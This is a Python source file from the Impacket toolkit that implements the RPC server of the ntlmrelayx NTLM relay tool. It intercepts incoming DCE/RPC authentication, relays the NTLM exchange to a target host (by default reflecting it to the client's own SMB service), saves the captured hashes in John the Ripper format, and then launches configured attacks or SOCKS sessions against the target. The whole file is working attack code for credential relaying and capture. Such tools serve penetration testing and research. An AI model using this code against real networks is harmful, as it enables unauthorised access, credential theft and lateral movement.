#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information
#
# RPC Relay Server inspired from DCERPCServer
#
# Authors:
#  Sylvain Heiniger / Compass Security (@sploutchy / https://www.compass-security.com)
#
# Description:
#             This is the RPC server which relays the connections
# to other protocols

import socketserver
import struct
from impacket.dcerpc.v5.epm import *
from impacket.dcerpc.v5.rpcrt import *
from impacket.dcerpc.v5.dcomrt import *
from impacket.ntlm import NTLMSSP_AUTH_NEGOTIATE, NTLMSSP_AUTH_CHALLENGE_RESPONSE, NTLMSSP_AUTH_CHALLENGE
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.nt_errors import ERROR_MESSAGES, STATUS_SUCCESS
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.utils import get_address


class RPCRelayServer(Thread):
    class RPCSocketServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        def __init__(self, server_address, RequestHandlerClass, config):
            self.config = config
            self.daemon_threads = True
            self.address_family, server_address = get_address(server_address[0], server_address[1], self.config.ipv6)
            socketserver.TCPServer.allow_reuse_address = True
            socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)

    class RPCHandler(socketserver.BaseRequestHandler):
        def __init__(self, request, client_address, server):
            self.client = None
            self.target = None
            self.auth_user = None
            self.transport = None
            self.request_header = None
            self.request_pdu_data = None
            self.request_sec_trailer = None
            self.challengeMessage = None
            socketserver.BaseRequestHandler.__init__(self, request, client_address, server)

        def setup(self):
            self.transport = DCERPCServer(self.request)
            IObjectExporterCallBacks = {
                5: self.send_ServerAlive2Response,
            }
            self.transport.addCallbacks(bin_to_uuidtup(IID_IObjectExporter), "135", IObjectExporterCallBacks)

            IEPMCallBacks = {
                3: self.handle_epmap
            }
            self.transport.addCallbacks(bin_to_uuidtup(MSRPC_UUID_PORTMAP), "135", IEPMCallBacks)

            if self.server.config.target is None:
                # Reflection mode, defaults to SMB at the target, for now
                self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % self.client_address[0])

        def handle_epmap(self, data):
            request = ept_map(data)

            resp = ept_mapResponse()
            tow_arr = twr_p_t_array()
            resp['status'] = 0
            resp['num_towers'] = 1
            req_handle = ept_lookup_handle_t()
            req_handle['context_handle_attributes'] = 0
            req_handle['context_handle_uuid'] = b'\00'*20
            resp['entry_handle'] = req_handle
            resp_tower = b''.join(request['map_tower']['tower_octet_string']) # just reflect the tower back

            resp_tower_p = twr_p_t()
            resp_tower_p['tower_length'] = len(resp_tower)
            resp_tower_p['tower_octet_string'] = resp_tower
            resp_tower_p['ReferentID'] = 3
            tow_arr['Data'].append(resp_tower_p)
            tow_arr['MaximumCount'] = request['max_towers']
            resp['ITowers'] = tow_arr
            return resp

        def send_ServerAlive2Response(self, request):
            response = ServerAlive2Response()

            stringBindings = [(TOWERID_DOD_TCP, self.target.hostname)]
            securityBindings = [(RPC_C_AUTHN_WINNT, "")]

            array = b''
            for wTowerId, aNetworkAddr in stringBindings:
                array += wTowerId.to_bytes(1, byteorder='little')  # formatting in a ushort is performed later
                array += aNetworkAddr.encode('utf8') + b'\x00'
            array += b'\x00' * (2 - (len(array) % 2))  # Fix alignment
            response['ppdsaOrBindings']['wSecurityOffset'] = len(array)
            for wAuthnSvc, aPrincName in securityBindings:
                array += wAuthnSvc.to_bytes(1, byteorder='little')
                array += b'\xff'  # This should be \xff\xff but as it's formatted on a ushort, it doesn't work |-(
                array += aPrincName.encode('utf8') + b'\x00'
            array += b'\x00' * (2 - (len(array) % 2))  # Fix alignment
            response['ppdsaOrBindings']['wNumEntries'] = len(array)
            response['ppdsaOrBindings']['aStringArray'] = array

            return response

        def handle(self):
            try:
                while True:
                    data = self.transport.recv()
                    if data is None:
                        # No data: connection closed
                        LOG.debug('(RPC): Connection closed by client')
                        return
                    response = self.handle_single_request(data)
                    # if not response:
                    # Nothing more to say, close connection
                    #    return
                    if response:
                        LOG.debug('(RPC): Sending packet of type %s' % msrpc_message_type[response['type']])
                        self.transport.send(response)
            except KeyboardInterrupt:
                raise
            except ConnectionResetError:
                LOG.error("(RPC): Connection reset.")
            except Exception as e:
                LOG.debug("(RPC): Exception:", exc_info=True)
                LOG.error('(RPC): Exception in RPC request handler: %s' % e)

        def handle_single_request(self, data):
            self.request_header = MSRPCHeader(data)
            req_type = self.request_header['type']
            LOG.debug('(RPC): Received packet of type %s' % msrpc_message_type[req_type])
            if req_type in (MSRPC_BIND, MSRPC_ALTERCTX):
                self.request_pdu_data = MSRPCRelayBind(self.request_header['pduData'])
            elif req_type == MSRPC_AUTH3:
                # We don't need the data and don't have AUTH3 Structure anyway
                # self.requestPduData = MSRPCAUTH3(self.requestHeader['pduData'])
                pass
            elif req_type == MSRPC_REQUEST:
                # This is a RPC request, we try to answer it the best we can.
                return self.transport.processRequest(data)
            else:
                LOG.error('(RPC): Packet type received not supported (yet): %a' % msrpc_message_type[req_type])
                return self.send_error(MSRPC_STATUS_CODE_NCA_S_UNSUPPORTED_TYPE)

            if self.request_header['auth_len'] <= 0:
                if req_type == MSRPC_BIND:
                    # Let's answer to the bind anyway, maybe a second request with authentication comes later
                    LOG.debug('(RPC): Answering to a BIND without authentication')
                    return self.transport.processRequest(data)
                LOG.error('(RPC): Packet is no BIND and does not contain authentication')
                return self.send_error(MSRPC_STATUS_CODE_RPC_S_BINDING_HAS_NO_AUTH)

            self.request_sec_trailer = SEC_TRAILER(self.request_header['sec_trailer'])

            auth_type = self.request_sec_trailer['auth_type']
            if auth_type == RPC_C_AUTHN_NONE:
                # What should we do here :(
                LOG.error('(RPC): Packet contains "None" authentication')
                return self.send_error(MSRPC_STATUS_CODE_RPC_S_BINDING_HAS_NO_AUTH)
            elif auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
                if req_type == MSRPC_AUTH3:
                    raise Exception('AUTH3 packet contains "SPNEGO" authentication')
                # Negotiate NTLM!
                raise NotImplementedError('SPNEGO auth_type not implemented yet')
            elif auth_type == RPC_C_AUTHN_WINNT or auth_type == RPC_C_AUTHN_DEFAULT:
                # Great success!
                if req_type not in (MSRPC_BIND, MSRPC_ALTERCTX, MSRPC_AUTH3):
                    raise Exception('Packet type received not supported (yet): %s' % msrpc_message_type[req_type])
                return self.negotiate_ntlm_session()
            elif auth_type == RPC_C_AUTHN_GSS_SCHANNEL or auth_type == RPC_C_AUTHN_GSS_KERBEROS or auth_type == RPC_C_AUTHN_NETLOGON:
                # Try to ask for NTLM?
                # Reply with rpc_s_unknown_authn_service?
                # Try answering with other error codes?
                raise NotImplementedError('Auth type %s not implemented yet' % auth_type)
            else:
                raise Exception('Auth type received not supported (yet): %d' % auth_type)

        def negotiate_ntlm_session(self):
            token = self.request_header['auth_data']
            messageType = struct.unpack('<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00') + 4])[0]

            if messageType == NTLMSSP_AUTH_NEGOTIATE:
                negotiateMessage = ntlm.NTLMAuthNegotiate()
                negotiateMessage.fromString(token)

                self.target = self.server.config.target.getTarget(multiRelay=False)
                if self.target is None:
                    if self.server.config.keepRelaying:
                        LOG.info("(RPC): No target left: keepRelaying active, reloading targets.")
                        self.server.config.target.reloadTargets(full_reload=True)
                        self.target = self.server.config.target.getTarget(multiRelay=False)
                        LOG.info("(RPC): Received connection from %s, attacking target %s://%s" % (self.client_address[0], self.target.scheme, self.target.netloc))
                    else:
                        LOG.info("(RPC): No target left")
                        return self.send_error(MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED)
                else:
                    LOG.info("(RPC): Received connection from %s, attacking target %s://%s" % (self.client_address[0], self.target.scheme, self.target.netloc))

                try:
                    self.do_ntlm_negotiate(token)  # Computes the challenge message
                    if not self.challengeMessage or self.challengeMessage is False:
                        raise Exception("Client send negotiated failed.")
                    return self.bind(self.challengeMessage)
                except Exception as e:
                    # Connection failed
                    if self.target is None:
                        LOG.error('(RPC): Negotiating NTLM failed, and no target left')
                    else:
                        LOG.error('(RPC): Negotiating NTLM with %s://%s failed.', self.target.scheme, self.target.netloc)
                        self.server.config.target.registerTarget(self.target)
                    return self.send_error(MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED)

            elif messageType == NTLMSSP_AUTH_CHALLENGE:
                raise Exception('Challenge Message raise, not implemented!')

            elif messageType == NTLMSSP_AUTH_CHALLENGE_RESPONSE:
                authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)

                # Only skip to next if the login actually failed, not if it was just anonymous login
                if authenticateMessage['user_name'] == b'':
                    # Anonymous login
                    LOG.error('(RPC): Empty username ... just waiting')
                    return None
                    # LOG.error('Empty username ... answering with %s' % rpc_status_codes[MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED])
                    # return self.send_error(MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED)

                try:
                    self.do_ntlm_auth(token, authenticateMessage)
                    self.client.setClientId()
                    # Relay worked, do whatever we want here...
                    if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                        LOG.info("(RPC): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
                            authenticateMessage['domain_name'].decode('utf-16le'), authenticateMessage['user_name'].decode('utf-16le'),
                            self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
                    else:
                        LOG.info("(RPC): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
                            authenticateMessage['domain_name'].decode('ascii'), authenticateMessage['user_name'].decode('ascii'),
                            self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))

                    ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                        authenticateMessage['user_name'],
                                                        authenticateMessage['domain_name'],
                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                    self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                    if self.server.config.outputFile is not None:
                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              self.server.config.outputFile)

                    # Log this target as processed for this client
                    self.server.config.target.registerTarget(self.target, True, self.auth_user)

                    self.do_attack()
                    return self.send_error(MSRPC_STATUS_CODE_RPC_S_ACCESS_DENIED)
                except Exception as e:
                    if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                        LOG.error("(RPC): Authenticating against %s://%s as %s\\%s FAILED" % (
                            self.target.scheme, self.target.netloc,
                            authenticateMessage['domain_name'].decode('utf-16le'),
                            authenticateMessage['user_name'].decode('utf-16le')))
                    else:
                        LOG.error("(RPC): Authenticating against %s://%s as %s\\%s FAILED" % (
                            self.target.scheme, self.target.netloc,
                            authenticateMessage['domain_name'].decode('ascii'),
                            authenticateMessage['user_name'].decode('ascii')))

                    self.server.config.target.registerTarget(self.target)
                    raise
            else:
                raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

        def do_ntlm_negotiate(self, token):
            if self.target.scheme.upper() in self.server.config.protocolClients:
                self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config,
                                                                                             self.target)
                # If connection failed, return
                if not self.client.initConnection():
                    raise Exception("Client connection failed.")
                self.challengeMessage = self.client.sendNegotiate(token)

                # Remove target NetBIOS field from the NTLMSSP_CHALLENGE
                if self.server.config.remove_target:
                    av_pairs = ntlm.AV_PAIRS(self.challengeMessage['TargetInfoFields'])
                    del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
                    self.challengeMessage['TargetInfoFields'] = av_pairs.getData()
                    self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
                    self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())
            else:
                LOG.error('(RPC): Protocol Client for %s not found!' % self.target.scheme.upper())
                raise Exception('Protocol Client for %s not found!' % self.target.scheme.upper())

        def bind(self, challengeMessage=b''):
            bindAck = MSRPCRelayBindAck()

            bindAck['max_tfrag'] = self.request_pdu_data['max_tfrag']
            bindAck['max_rfrag'] = self.request_pdu_data['max_rfrag']
            bindAck['assoc_group'] = 0x12345678  # whatever, but not 0!!!

            if not self.request_pdu_data.getCtxItems():
                # No CTX Items
                raise Exception('Bind request with no CTX Item.')
            for requestItem in self.request_pdu_data.getCtxItems():
                syntax, version = bin_to_uuidtup(requestItem['TransferSyntax'])
                item = CtxItemResult()
                # Bind Time Feature Negotiation need to be answered properly |-(
                if syntax.startswith(MSRPC_BIND_TIME_FEATURE_NEGOTIATION_PREFIX) and version == "1.0":
                    item['Result'] = MSRPC_CONT_RESULT_NEGOTIATE_ACK
                    item['Reason'] = MSRPC_BIND_TIME_FEATURE_NEGOTIATION_SECURITY_CONTEXT_MULTIPLEXING_SUPPORTED_BITMASK | MSRPC_BIND_TIME_FEATURE_NEGOTIATION_KEEP_CONNECTION_ON_ORPHAN_SUPPORTED_BITMASK
                    item['TransferSyntax'] = "\x00" * 20
                else:
                    if requestItem['TransferSyntax'] == DCERPC.NDR64Syntax:
                        item['Result'] = MSRPC_CONT_RESULT_PROV_REJECT
                        item['Reason'] = 2
                        item['TransferSyntax'] = ('00000000-0000-0000-0000-000000000000',0.0)
                    # Accept all other Context Items, because we want authentication!
                    else:
                        item['Result'] = MSRPC_CONT_RESULT_ACCEPT
                        item['TransferSyntax'] = requestItem['TransferSyntax']
                        self.transport._boundUUID = requestItem['AbstractSyntax']
                bindAck.addCtxItem(item)
            # TODO: This is probably not generic enough :(
            bindAck['SecondaryAddr'] = "9999"

            packet = MSRPCHeader()
            if self.request_header['type'] == MSRPC_BIND:
                packet['type'] = MSRPC_BINDACK
            elif self.request_header['type'] == MSRPC_ALTERCTX:
                packet['type'] = MSRPC_ALTERCTX_R
            else:
                raise Exception('Message type %d is not supported in bind' % self.request_header['type'])
            packet['pduData'] = bindAck.getData()
            packet['call_id'] = self.request_header['call_id']
            packet['flags'] = self.request_header['flags']

            if challengeMessage != b'':
                secTrailer = SEC_TRAILER()
                secTrailer['auth_type'] = self.request_sec_trailer['auth_type']
                # TODO: Downgrading auth_level?
                secTrailer['auth_level'] = self.request_sec_trailer['auth_level']
                # TODO: What is this number?
                secTrailer['auth_ctx_id'] = self.request_sec_trailer['auth_ctx_id']

                pad = (4 - (len(packet.get_packet()) % 4)) % 4
                if pad != 0:
                    packet['pduData'] += b'\xFF' * pad
                    secTrailer['auth_pad_len'] = pad

                packet['sec_trailer'] = secTrailer
                packet['auth_data'] = challengeMessage
                packet['auth_len'] = len(challengeMessage)

            return packet  # .get_packet()

        def send_error(self, status):
            packet = MSRPCRespHeader(self.request_header.getData())
            request_type = self.request_header['type']
            if request_type == MSRPC_BIND:
                packet['type'] = MSRPC_BINDNAK
            else:
                packet['type'] = MSRPC_FAULT
            if status:
                packet['pduData'] = pack('<L', status)
            return packet

        def do_ntlm_auth(self, token, authenticateMessage):
            # For some attacks it is important to know the authenticated username, so we store it
            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                self.auth_user = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
                                             authenticateMessage['user_name'].decode('utf-16le'))).upper()
            else:
                self.auth_user = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
                                             authenticateMessage['user_name'].decode('ascii'))).upper()

            clientResponse, errorCode = self.client.sendAuth(token, self.challengeMessage['challenge'])

            # Raise exception on bad clientResponse?
            if errorCode != STATUS_SUCCESS:
                if errorCode in ERROR_MESSAGES.keys():
                    raise Exception("NTLM authentication failure, got errorCode %s: %s" % (errorCode, ERROR_MESSAGES[errorCode]))
                else:
                    raise Exception("NTLM authentication failure, got unknown errorCode %s" % errorCode)


        def do_attack(self):
            # Check if SOCKS is enabled and if we support the target scheme
            if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
                # Pass all the data to the socksplugins proxy
                activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(),
                                       self.auth_user, self.client, self.client.sessionData))
                return

            # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
            if self.target.scheme.upper() in self.server.config.attacks:
                # We have an attack.. go for it
                clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config,
                                                                                      self.client.session,
                                                                                      self.auth_user,
                                                                                      self.target,
                                                                                      self.client)
                clientThread.start()
            else:
                LOG.error('(RPC): No attack configured for %s' % self.target.scheme.upper())

    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def run(self):
        LOG.info("Setting up RPC Server on port %d"%self.config.listeningPort)

        self.server = self.RPCSocketServer((self.config.interfaceIp, self.config.listeningPort), self.RPCHandler,
                                           self.config)

        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            pass
        LOG.info('Shutting down RPC Server')
        self.server.server_close()
